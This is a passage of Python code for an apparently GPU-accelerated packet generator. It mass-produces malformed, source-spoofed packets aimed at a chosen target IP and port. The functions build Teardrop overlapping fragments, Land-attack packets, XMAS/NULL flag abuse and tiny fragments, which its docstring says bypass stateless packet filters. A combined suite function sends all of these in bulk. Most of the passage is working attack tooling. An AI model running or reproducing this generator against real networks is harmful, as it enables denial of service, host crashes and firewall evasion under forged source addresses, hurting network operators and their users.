    # Remaining TCP header bytes (ack, offset/flags, window, checksum, urgent)
    tcp2_off = curr + IP_HEADER_LEN
    write_uint32_be(packets_buffer, tcp2_off, 0)  # Ack number
    packets_buffer[tcp2_off + 4] = 0x50  # Data offset
    packets_buffer[tcp2_off + 5] = TCP_SYN  # Flags (hidden from frag 1)
    write_uint16_be(packets_buffer, tcp2_off + 6, 64240)  # Window
    write_uint16_be(packets_buffer, tcp2_off + 8, 0)  # Checksum
    write_uint16_be(packets_buffer, tcp2_off + 10, 0)  # Urgent


# ============================================================================
# Host-Side API
# ============================================================================

def _parse_subnet(spoof_subnet):
    """Parse CIDR subnet notation."""
    if spoof_subnet is None:
        spoof_subnet = "1.0.0.0/8"
    if "/" in spoof_subnet:
        base_ip_str, mask_str = spoof_subnet.split("/")
        spoof_mask = int(mask_str)
    else:
        base_ip_str = spoof_subnet
        spoof_mask = 32
    spoof_base_ip = int(sum(
        [int(x) << (24 - i * 8) for i, x in enumerate(base_ip_str.split('.'))]
    ))
    return spoof_base_ip, spoof_mask


def _ip_to_int(ip_str):
    """Convert dotted IP string to integer."""
    return int(sum(
        [int(x) << (24 - i * 8) for i, x in enumerate(ip_str.split('.'))]
    ))


def generate_anomaly_packets(
    count: int,
    target_ip: str,
    target_port: int,
    anomaly_types: Optional[List[int]] = None,
    real_src_ip: str = "192.168.1.100",
    spoof_ip: bool = True,
    has_ethernet: bool = True,
    anomaly_intensity: int = 50,
    stream=None,
    gateway_mac: int = 0xFFFFFFFFFFFF,
    spoof_subnet: str = "1.0.0.0/8"
) -> Tuple[cp.ndarray, int]:
    """
    Generate anomalous/malformed packets on GPU.

    Args:
        count: Number of packets to generate
        target_ip: Target IP address
        target_port: Target port
        anomaly_types: List of AnomalyType values. None = all types.
        real_src_ip: Real source IP
        spoof_ip: Enable IP spoofing
        has_ethernet: Include Ethernet header
        anomaly_intensity: 0-100, how broken packets should be
        stream: CUDA stream
        gateway_mac: Gateway MAC as integer
        spoof_subnet: CIDR for spoofing

    Returns:
        Tuple of (gpu_buffer, packet_size)
    """
    if anomaly_types is None:
        # Use all basic anomaly types (excluding fragment types handled separately)
        anomaly_types = [0, 1, 2, 3, 4, 5, 8, 9, 10, 11]

    target_ip_int = _ip_to_int(target_ip)
    real_src_ip_int = _ip_to_int(real_src_ip)
    spoof_base_ip, spoof_mask = _parse_subnet(spoof_subnet)

    # Fixed packet size for anomaly packets
    max_pkt_size = 128
    eth_len = ETHERNET_HEADER_LEN if has_ethernet else 0
    packet_size = max_pkt_size

    # Ensure minimum Ethernet frame
    if has_ethernet and packet_size < 64:
        packet_size = 64

    # Allocate GPU buffers
    packets_gpu = cp.zeros(count * packet_size, dtype=cp.uint8)
    rng_states = create_xoroshiro128p_states(count, seed=random.randint(0, 0xFFFFFFFF))

    # Upload anomaly types array
    anomaly_arr_np = np.array(anomaly_types, dtype=np.int32)
    # Tile to match packet alignment if needed
    anomaly_gpu = cp.array(anomaly_arr_np, dtype=cp.int32)

    threads = 256
    blocks = (count + threads - 1) // threads

    anomaly_packet_kernel[blocks, threads, stream](
        packets_gpu, np.int64(count),
        np.int64(target_ip_int), np.int64(target_port),
        np.int64(real_src_ip_int), np.int64(1 if spoof_ip else 0),
        np.int64(1 if has_ethernet else 0),
        rng_states, np.int64(gateway_mac),
        np.int64(spoof_base_ip), np.int64(spoof_mask),
        anomaly_gpu, np.int64(len(anomaly_types)),
        np.int64(anomaly_intensity)
    )

    logging.info(
        f"[AnomalyEngine] Generated {count} anomaly packets "
        f"({len(anomaly_types)} types, intensity={anomaly_intensity})"
    )
    return packets_gpu, packet_size


def generate_overlapping_fragments(
    count: int,
    target_ip: str,
    target_port: int,
    real_src_ip: str = "192.168.1.100",
    spoof_ip: bool = True,
    has_ethernet: bool = True,
    frag_size: int = 128,
    stream=None,
    gateway_mac: int = 0xFFFFFFFFFFFF,
    spoof_subnet: str = "1.0.0.0/8"
) -> Tuple[cp.ndarray, int]:
    """
    Generate overlapping IP fragment pairs (Teardrop-style).

    Returns 2 fragments per logical packet.

    Args:
        count: Number of fragment pairs
        frag_size: Size of each fragment

    Returns:
        Tuple of (gpu_buffer, total_size_per_pair)
    """
    target_ip_int = _ip_to_int(target_ip)
    real_src_ip_int = _ip_to_int(real_src_ip)
    spoof_base_ip, spoof_mask = _parse_subnet(spoof_subnet)

    total_per_pair = frag_size * 2
    packets_gpu = cp.zeros(count * total_per_pair, dtype=cp.uint8)
    rng_states = create_xoroshiro128p_states(count, seed=random.randint(0, 0xFFFFFFFF))

    threads = 256
    blocks = (count + threads - 1) // threads

    overlapping_fragment_kernel[blocks, threads, stream](
        packets_gpu, np.int64(count),
        np.int64(target_ip_int), np.int64(target_port),
        np.int64(real_src_ip_int), np.int64(1 if spoof_ip else 0),
        np.int64(1 if has_ethernet else 0),
        rng_states, np.int64(gateway_mac),
        np.int64(spoof_base_ip), np.int64(spoof_mask),
        np.int64(frag_size)
    )

    logging.info(f"[AnomalyEngine] Generated {count} overlapping fragment pairs")
    return packets_gpu, total_per_pair


def generate_tiny_fragments(
    count: int,
    target_ip: str,
    target_port: int,
    real_src_ip: str = "192.168.1.100",
    spoof_ip: bool = True,
    has_ethernet: bool = True,
    stream=None,
    gateway_mac: int = 0xFFFFFFFFFFFF,
    spoof_subnet: str = "1.0.0.0/8"
) -> Tuple[cp.ndarray, int]:
    """
    Generate tiny IP fragments that split TCP headers across fragments.

    This bypasses stateless packet filters that only inspect Fragment 1.

    Returns:
        Tuple of (gpu_buffer, slot_size_per_pair)
    """
    target_ip_int = _ip_to_int(target_ip)
    real_src_ip_int = _ip_to_int(real_src_ip)
    spoof_base_ip, spoof_mask = _parse_subnet(spoof_subnet)

    slot_size = 64
    total_per_pair = slot_size * 2
    packets_gpu = cp.zeros(count * total_per_pair, dtype=cp.uint8)
    rng_states = create_xoroshiro128p_states(count, seed=random.randint(0, 0xFFFFFFFF))

    threads = 256
    blocks = (count + threads - 1) // threads

    tiny_fragment_kernel[blocks, threads, stream](
        packets_gpu, np.int64(count),
        np.int64(target_ip_int), np.int64(target_port),
        np.int64(real_src_ip_int), np.int64(1 if spoof_ip else 0),
        np.int64(1 if has_ethernet else 0),
        rng_states, np.int64(gateway_mac),
        np.int64(spoof_base_ip), np.int64(spoof_mask)
    )

    logging.info(f"[AnomalyEngine] Generated {count} tiny fragment pairs")
    return packets_gpu, total_per_pair


# ============================================================================
# Convenience: All-in-One Anomaly Generator
# ============================================================================

def generate_full_anomaly_suite(
    count: int,
    target_ip: str,
    target_port: int,
    real_src_ip: str = "192.168.1.100",
    spoof_ip: bool = True,
    has_ethernet: bool = True,
    anomaly_intensity: int = 75,
    stream=None,
    gateway_mac: int = 0xFFFFFFFFFFFF,
    spoof_subnet: str = "1.0.0.0/8"
) -> Dict[str, Tuple[cp.ndarray, int]]:
    """
    Generate a complete suite of anomaly packets across all techniques.

    Splits count into three groups:
        60% - Standard anomalies (all 10 types)
        25% - Overlapping fragments
        15% - Tiny fragments

    Returns:
        Dict with keys 'anomaly', 'overlap_frag', 'tiny_frag',
        each mapping to (gpu_buffer, packet_size)
    """
    n_anomaly = int(count * 0.60)
    n_overlap = int(count * 0.25)
    n_tiny = count - n_anomaly - n_overlap

    results = {}

    if n_anomaly > 0:
        results['anomaly'] = generate_anomaly_packets(
            n_anomaly, target_ip, target_port,
            real_src_ip=real_src_ip, spoof_ip=spoof_ip,
            has_ethernet=has_ethernet, anomaly_intensity=anomaly_intensity,
            stream=stream, gateway_mac=gateway_mac, spoof_subnet=spoof_subnet
        )

    if n_overlap > 0:
        results['overlap_frag'] = generate_overlapping_fragments(
            n_overlap, target_ip, target_port,
            real_src_ip=real_src_ip, spoof_ip=spoof_ip,
            has_ethernet=has_ethernet,
            stream=stream, gateway_mac=gateway_mac, spoof_subnet=spoof_subnet
        )

    if n_tiny > 0:
        results['tiny_frag'] = generate_tiny_fragments(
            n_tiny, target_ip, target_port,
            real_src_ip=real_src_ip, spoof_ip=spoof_ip,
            has_ethernet=has_ethernet,
            stream=stream, gateway_mac=gateway_mac, spoof_subnet=spoof_subnet
        )

    logging.info(
        f"[AnomalyEngine] Full suite: {n_anomaly} anomaly + "
        f"{n_overlap} overlap + {n_tiny} tiny = {count} total"
    )
    return results


# ============================================================================
# Module Info
# ============================================================================

ANOMALY_DESCRIPTIONS = {
    AnomalyType.INVALID_IHL: "Invalid IP Header Length (IHL=0,1,2)",
    AnomalyType.INVALID_IP_LENGTH: "Invalid IP Total Length (undersized/oversized)",
    AnomalyType.INVALID_IP_VERSION: "Invalid IP Version (0,3,7,15)",
    AnomalyType.INVALID_PROTOCOL: "Invalid/Reserved Protocol Numbers (143-254)",
    AnomalyType.TCP_FLAG_ABUSE: "TCP Flag Abuse (XMAS, NULL, SYN+FIN, SYN+RST)",
    AnomalyType.INVALID_TCP_OFFSET: "Invalid TCP Data Offset (0,1,15)",
    AnomalyType.OVERLAPPING_FRAGMENTS: "Overlapping IP Fragments (Teardrop)",
    AnomalyType.TINY_FRAGMENTS: "Tiny Fragments (TCP header split)",
    AnomalyType.LAND_ATTACK: "Land Attack (src==dst IP and port)",
    AnomalyType.INVALID_CHECKSUM: "Invalid/Corrupt Checksums (IP+TCP)",
    AnomalyType.TTL_ANOMALY: "TTL Anomalies (0, 1, 255)",
    AnomalyType.MALFORMED_OPTIONS: "Malformed TCP Options (invalid lengths/garbage)",
}


def get_anomaly_info() -> Dict[int, str]:
    """Get descriptions of all available anomaly types."""
    return dict(ANOMALY_DESCRIPTIONS)
